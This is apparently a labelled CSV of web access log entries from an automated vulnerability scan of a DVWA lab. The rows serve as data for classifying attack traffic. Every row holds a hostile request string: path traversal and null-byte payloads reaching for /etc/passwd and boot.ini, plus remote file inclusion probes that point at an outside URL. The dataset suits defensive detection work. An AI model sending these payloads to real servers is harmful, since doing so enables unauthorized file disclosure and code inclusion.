ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../etc/passwd&amp;page=1 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../etc/passwd&amp;page=1,HTTP/1.1,126,15,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,"GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini&amp;page=1 HTTP/1.1",404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,"/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini&amp;page=1",HTTP/1.1,135,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd%00&amp;page=1 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd%00&amp;page=1,HTTP/1.1,105,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1,HTTP/1.1,102,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=%60/etc/passwd%60 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=%60/etc/passwd%60,HTTP/1.1,110,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=....//....//....//....//....//....//....//etc.passwd HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=....//....//....//....//....//....//....//etc.passwd,HTTP/1.1,145,19,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=../../../../../../../../../etc/passwd%00 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=../../../../../../../../../etc/passwd%00,HTTP/1.1,133,15,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/....../boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/....../boot.ini,HTTP/1.1,109,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/..../boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/..../boot.ini,HTTP/1.1,107,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.../.../.../.../.../.../boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.../.../.../.../.../.../boot.ini,HTTP/1.1,126,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../../../../../../../../../../../boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../../../../../../../../../../../boot.ini,HTTP/1.1,162,26,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../etc/passwd HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../etc/passwd,HTTP/1.1,134,17,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,"GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini HTTP/1.1",404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,"/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini",HTTP/1.1,137,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd,HTTP/1.1,104,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd%00 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd%00,HTTP/1.1,107,7,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=c:\\boot.ini HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=c:\\boot.ini,HTTP/1.1,105,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=c:\\boot.ini&amp;page=1 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=1771&amp;nn=c:\\boot.ini&amp;page=1,HTTP/1.1,103,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=c:\\boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum1_professionnel.asp?n=c:\\boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,229,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=%60/etc/passwd%60|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=%60/etc/passwd%60|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.,HTTP/1.1,178,7,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=../../../../../../../../../etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=../../../../../../../../../etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,201,16,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=/....../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=/....../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,177,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=/.../.../.../.../.../.../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=/.../.../.../.../.../.../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,194,13,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,230,27,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=/../../../../../../../../etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=/../../../../../../../../etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,196,16,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,"GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1",400,483,-,-,Recon,GET,"/DVWA/vulnerabilities/brute/forum_arc.asp?n=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.",HTTP/1.1,205,12,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=/etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=/etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,175,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=/etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=/etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,172,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=268 HTTP/1.1,404,490,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=268,HTTP/1.1,60,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_arc.asp?n=c:\\boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_arc.asp?n=c:\\boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.,HTTP/1.1,174,5,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.,HTTP/1.1,188,7,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,223,20,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,211,16,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,187,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/.../.../.../.../.../.../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/.../.../.../.../.../.../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,204,13,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,240,27,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/../../../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/../../../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,206,16,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,"GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1",400,483,-,-,Recon,GET,"/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.",HTTP/1.1,215,12,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,185,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,HTTP/1.1,182,8,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=100 HTTP/1.1,404,490,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=100,HTTP/1.1,70,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/forum_professionnel.asp?n=c:\\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;. HTTP/1.1,400,483,-,-,Recon,GET,/DVWA/vulnerabilities/brute/forum_professionnel.asp?n=c:\\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.,HTTP/1.1,184,5,1,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/functions.inc.php+ HTTP/1.1,404,490,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/functions.inc.php+,HTTP/1.1,59,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/get_od_toc.pl?Profile= HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/get_od_toc.pl?Profile=,HTTP/1.1,63,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/globals.php3 HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/globals.php3,HTTP/1.1,53,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/globals.pl HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/globals.pl,HTTP/1.1,51,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/Gozila.cgi HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/Gozila.cgi,HTTP/1.1,51,5,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/helperfunction.php?includedir=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/helperfunction.php?includedir=http://cirt.net/public/rfiinc.txt,HTTP/1.1,104,9,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/homebet/homebet.dll?form=menu&amp;option=menu-signin HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/homebet/homebet.dll?form=menu&amp;option=menu-signin,HTTP/1.1,93,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/htmltonuke.php?filnavn=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/htmltonuke.php?filnavn=http://cirt.net/public/rfiinc.txt,HTTP/1.1,97,9,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/idealbb/error.asp?|-|0|404_Object_Not_Found HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/idealbb/error.asp?|-|0|404_Object_Not_Found,HTTP/1.1,84,6,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:04-04:00,GET /DVWA/vulnerabilities/brute/iisprotect/admin/SiteAdmin.ASP?|-|0|404_Object_Not_Found HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/iisprotect/admin/SiteAdmin.ASP?|-|0|404_Object_Not_Found,HTTP/1.1,97,7,115,Recon
